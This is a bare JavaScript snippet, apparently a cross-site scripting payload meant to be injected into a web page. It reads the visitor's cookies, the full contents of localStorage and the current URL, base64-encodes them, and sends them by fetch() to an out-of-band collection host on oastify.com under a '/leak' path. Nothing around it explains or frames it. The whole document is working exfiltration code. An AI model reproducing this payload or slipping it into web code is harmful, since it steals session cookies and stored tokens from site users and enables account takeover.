fetch("https://ebt4xhwz0ffgihdddc7oqtkympsgg84x.oastify.com/leak?" +
  btoa(
    "cookie=" + document.cookie +
    "&ls=" + JSON.stringify(localStorage) +
    "&url=" + location.href
  ));
